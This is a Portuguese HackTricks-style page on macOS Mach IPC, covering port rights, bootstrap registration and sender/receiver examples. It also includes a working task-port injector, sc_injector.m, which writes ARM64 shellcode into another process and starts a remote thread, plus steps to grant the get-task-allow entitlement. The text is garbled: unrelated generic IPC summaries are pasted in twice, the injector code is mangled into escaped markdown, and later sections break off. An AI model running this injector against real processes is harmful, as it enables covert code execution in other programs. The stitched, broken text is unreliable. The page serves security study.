# macOS IPC - Inter Process Communication

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Mensagens Mach via Portas

### Informações Básicas

O Mach utiliza **tarefas** como a **unidade mais pequena** para compartilhar recursos, e cada tarefa pode conter **múltiplas threads**. Essas **tarefas e threads são mapeadas em uma relação 1:1 com processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação entre Processos Mach (IPC), utilizando canais de comunicação unidirecional. **As mensagens são transferidas entre portas**, que funcionam como **filas de mensagens** gerenciadas pelo kernel.

Cada processo possui uma **tabela IPC**, onde é possível encontrar as **portas mach do processo**. O nome de uma porta mach é na verdade um número (um ponteiro para o objeto do kernel).

Um processo também pode enviar um nome de porta com alguns direitos **para uma tarefa diferente** e o kernel fará com que essa entrada na **tabela IPC da outra tarefa** apareça.

### Direitos de Porta

Os direitos de porta, que definem quais operações uma tarefa pode realizar, são essenciais para essa comunicação. Os possíveis **direitos de porta** são ([definições daqui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Direito de Receber**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um consumidor), o que significa que pode haver apenas **um direito de receber para cada porta** em todo o sistema (ao contrário de pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
* Uma **tarefa com o Direito de Receber** pode receber mensagens e **criar Direitos de Envio**, permitindo enviar mensagens. Originalmente, apenas a **própria tarefa tem o Direito de Receber sobre sua porta**.
* **Direito de Envio**, que permite enviar mensagens para a porta.
* O Direito de Envio pode ser **clonado** para que uma tarefa que possui um Direito de Envio possa clonar o direito e **concedê-lo a uma terceira tarefa**.
* **Direito de Envio-único**, que permite enviar uma mensagem para a porta e depois desaparece.
* **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Os conjuntos de portas podem ser usados para escutar várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
* **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.

**As tarefas podem transferir DIREITOS DE ENVIO para outras**, permitindo que elas enviem mensagens de volta. **Os DIREITOS DE ENVIO também podem ser clonados, para que uma tarefa possa duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

### Portas de Arquivo

Portas de arquivo permitem encapsular descritores de arquivo em portas Mac (usando direitos de porta Mach). É possível criar um `fileport` a partir de um FD dado usando `fileport_makeport` e criar um FD a partir de um fileport usando `fileport_makefd`.

### Estabelecendo uma comunicação

#### Etapas:

Como mencionado, para estabelecer o canal de comunicação, o **servidor de inicialização** (**launchd** no Mac) está envolvido.

1. A Tarefa **A** inicia uma **nova porta**, obtendo um **direito de RECEBER** no processo.
2. A Tarefa **A**, sendo a detentora do direito de RECEBER, **gera um direito de ENVIO para a porta**.
3. A Tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, fornecendo o **nome do serviço da porta** e o **direito de ENVIO** por meio de um procedimento conhecido como registro de inicialização.
4. A Tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o nome do serviço**. Se bem-sucedido, o **servidor duplica o direito de ENVIO** recebido da Tarefa A e **transmite para a Tarefa B**.
5. Ao adquirir um direito de ENVIO, a Tarefa **B** é capaz de **formular** uma **mensagem** e enviá-la **para a Tarefa A**.
6. Para uma comunicação bidirecional, geralmente a tarefa **B** gera uma nova porta com um **direito de RECEBER** e um **direito de ENVIO**, e dá o **direito de ENVIO para a Tarefa A** para que ela possa enviar mensagens para a Tarefa B (comunicação bidirecional).

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **fingir ser qualquer tarefa do sistema**, como reivindicar falsamente um nome de serviço de autorização e então aprovar cada solicitação.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios protegidos pelo SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Ao lado de cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **direito de RECEBER para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo procurado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

* A Tarefa **B** inicia uma **busca de inicialização** para um nome de serviço.
* O **launchd** verifica se a tarefa está em execução e, se não estiver, a **inicia**.
* A Tarefa **A** (o serviço) executa um **check-in de inicialização**. Aqui, o **servidor de inicialização** cria um direito de ENVIO, o retém e **transfere o direito de RECEBER para a Tarefa A**.
* O launchd duplica o **direito de ENVIO e envia para a Tarefa B**.
* A Tarefa **B** gera uma nova porta com um **direito de RECEBER** e um **direito de ENVIO**, e dá o **direito de ENVIO para a Tarefa A** (o svc) para que ela possa enviar mensagens para a Tarefa B (comunicação bidirecional).

No entanto, esse processo se aplica apenas a tarefas de sistema predefinidas. Tarefas não pertencentes ao sistema ainda operam conforme descrito originalmente, o que poderia potencialmente permitir a falsificação.

### Uma Mensagem Mach

[Encontre mais informações aqui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

A função `mach_msg`, essencialmente uma chamada de sistema, é utilizada para enviar e receber mensagens Mach. A função requer que a mensagem seja enviada como argumento inicial. Esta mensagem deve começar com uma estrutura `mach_msg_header_t`, seguida pelo conteúdo da mensagem real. A estrutura é definida da seguinte forma:

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Os processos que possuem um _**direito de recebimento**_ podem receber mensagens em uma porta Mach. Por outro lado, os **remetentes** recebem um _**direito de envio**_ ou um _**direito de envio único**_. O direito de envio único é exclusivamente para enviar uma única mensagem, após o que se torna inválido.

Para alcançar uma **comunicação bidirecional** fácil, um processo pode especificar uma **porta mach** no cabeçalho da mensagem mach chamada _porta de resposta_ (**`msgh_local_port`**) onde o **receptor** da mensagem pode **enviar uma resposta** a essa mensagem. Os bits de sinalização em **`msgh_bits`** podem ser usados para **indicar** que um **direito de envio único** deve ser derivado e transferido para esta porta (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Observe que esse tipo de comunicação bidirecional é usado em mensagens XPC que esperam uma resposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Mas **geralmente são criadas portas diferentes** como explicado anteriormente para criar a comunicação bidirecional.
{% endhint %}

Os outros campos do cabeçalho da mensagem são:

* `msgh_size`: o tamanho do pacote inteiro.
* `msgh_remote_port`: a porta para a qual esta mensagem é enviada.
* `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: o ID desta mensagem, que é interpretado pelo receptor.

{% hint style="danger" %}
Observe que **as mensagens mach são enviadas por uma porta mach**, que é um canal de comunicação de **um único receptor**, **múltiplos remetentes** integrado ao kernel mach. **Múltiplos processos** podem **enviar mensagens** para uma porta mach, mas em qualquer momento apenas **um único processo pode ler** dela.
{% endhint %}

### Enumerar portas

```bash
lsmp -p <pid>
```

Pode instalar esta ferramenta no iOS fazendo o download em [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemplo de código

Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

### macOS IPC - Comunicação entre Processos

#### Introdução

A Comunicação entre Processos (IPC) é um mecanismo essencial para que os processos possam trocar informações e coordenar suas atividades em um sistema operacional. No macOS, existem várias formas de IPC disponíveis, como notificações por push, Apple Events, XPC e IPC baseado em porta.

#### Apple Events

Os Apple Events são uma forma de IPC usada para automatizar aplicativos no macOS. Eles permitem que um aplicativo envie comandos e dados para outro aplicativo, possibilitando a automação de tarefas e a integração entre diferentes aplicativos.

#### XPC

O XPC é um framework de IPC leve e seguro fornecido pela Apple. Ele permite que os aplicativos dividam tarefas em processos separados, melhorando a estabilidade e segurança do sistema.

#### IPC baseado em porta

O IPC baseado em porta é uma forma de comunicação entre processos que utiliza portas para enviar mensagens entre processos. No macOS, o IPC baseado em porta é implementado pelo Mach IPC, que é a base para muitos outros mecanismos de IPC no sistema.

#### Conclusão

Compreender os diferentes mecanismos de IPC disponíveis no macOS é essencial para desenvolver aplicativos seguros e eficientes. Cada forma de IPC tem suas próprias vantagens e limitações, e a escolha do mecanismo adequado depende dos requisitos específicos de cada aplicativo.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### Portas Privilegiadas

* **Porta do host**: Se um processo tem **privilégio de Envio** sobre esta porta, ele pode obter **informações** sobre o **sistema** (por exemplo, `host_processor_info`).
* **Porta de privilégio do host**: Um processo com direito de **Envio** sobre esta porta pode realizar **ações privilegiadas** como carregar uma extensão de kernel. O **processo precisa ser root** para obter essa permissão.
* Além disso, para chamar a API **`kext_request`**, é necessário ter outros privilégios **`com.apple.private.kext*`**, que são concedidos apenas a binários da Apple.
* **Porta do nome da tarefa**: Uma versão não privilegiada da _porta da tarefa_. Ela faz referência à tarefa, mas não permite controlá-la. A única coisa aparentemente disponível por meio dela é `task_info()`.
* **Porta da tarefa** (também conhecida como porta do kernel)**:** Com permissão de Envio sobre esta porta, é possível controlar a tarefa (ler/escrever memória, criar threads...).
* Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa do chamador. Esta porta é apenas **herdada** através de **`exec()`**; uma nova tarefa criada com `fork()` obtém uma nova porta de tarefa (como caso especial, uma tarefa também obtém uma nova porta de tarefa após `exec()` em um binário suid). A única maneira de iniciar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) enquanto faz um `fork()`.
* Estas são as restrições para acessar a porta (do `macos_task_policy` do binário `AppleMobileFileIntegrity`):
  * Se o aplicativo tiver o privilégio **`com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
  * Aplicativos com o privilégio **`com.apple.system-task-ports`** podem obter a **porta da tarefa de qualquer** processo, exceto o kernel. Em versões mais antigas, era chamado de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
  * **Root pode acessar portas de tarefas** de aplicativos **não** compilados com um tempo de execução **fortificado** (e não da Apple).

### Injeção de Shellcode em thread via Porta da Tarefa

Você pode obter um shellcode em:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

### macOS IPC (Comunicação entre Processos)

#### Introdução

A Comunicação entre Processos (IPC) é um mecanismo essencial para que os processos em um sistema operacional possam interagir entre si. No macOS, existem várias formas de IPC, como notificações por push, Apple Events, XPC e IPC baseado em porta.

#### Notificações por Push

As notificações por push são usadas para enviar informações entre processos de forma assíncrona. Isso é comumente usado em aplicativos para notificar sobre eventos ou atualizações.

#### Apple Events

Os Apple Events são uma forma de IPC usada para automatizar tarefas entre aplicativos. Eles permitem que um aplicativo envie comandos para outro aplicativo para que ele execute ações específicas.

#### XPC

O XPC (XPC Services) é um mecanismo de IPC mais seguro e eficiente introduzido no macOS. Ele permite que os aplicativos dividam tarefas em processos separados, melhorando a segurança e estabilidade do sistema.

#### IPC baseado em porta

O IPC baseado em porta é usado para comunicação entre processos em um sistema. Cada porta tem um nome único e os processos podem enviar mensagens um para o outro através dessas portas.

#### Conclusão

Compreender os diferentes métodos de IPC no macOS é essencial para desenvolver aplicativos seguros e estáveis. Cada método tem suas próprias vantagens e casos de uso específicos, e escolher o método certo depende dos requisitos do aplicativo e do nível de segurança desejado.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**Compile** o programa anterior e adicione as **permissões** necessárias para poder injetar código com o mesmo usuário (caso contrário, será necessário usar **sudo**).

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### Injeção de Dylib em thread via porta de Tarefa

No macOS, as **threads** podem ser manipuladas via **Mach** ou usando a **API posix `pthread`**. A thread gerada na injeção anterior foi gerada usando a api Mach, então **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque **não era necessário trabalhar com apis compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar a thread**, ela deve chamar **`pthread_create_from_mach_thread`** que irá **criar um pthread válido**. Em seguida, este novo pthread poderia **chamar dlopen** para **carregar uma dylib** do sistema, então em vez de escrever novo shellcode para realizar ações diferentes, é possível carregar bibliotecas personalizadas.

Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um log e então você pode ouvi-lo):

\`\`\`bash gcc -framework Foundation -framework Appkit dylib\_injector.m -o dylib\_injector ./inject \`\`\` ### Sequestro de Thread via porta de tarefa

Nesta técnica, uma thread do processo é sequestrada:

### XPC

#### Informações Básicas

XPC, que significa Comunicação entre Processos XNU (o kernel usado pelo macOS), é um framework para **comunicação entre processos** no macOS e iOS. XPC fornece um mecanismo para fazer **chamadas de método seguras e assíncronas entre diferentes processos** no sistema. É parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com separação de privilégios** onde cada **componente** é executado com **apenas as permissões necessárias** para realizar seu trabalho, limitando assim os danos potenciais de um processo comprometido.

Para obter mais informações sobre como essa **comunicação funciona** e como ela **pode ser vulnerável**, confira:

### MIG - Gerador de Interface Mach

O MIG foi criado para **simplificar o processo de criação de código Mach IPC**. Basicamente, ele **gera o código necessário** para o servidor e o cliente se comunicarem com uma definição fornecida. Mesmo que o código gerado seja feio, um desenvolvedor só precisará importá-lo e seu código será muito mais simples do que antes.

Para mais informações, confira:

### Referências

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)



</details>
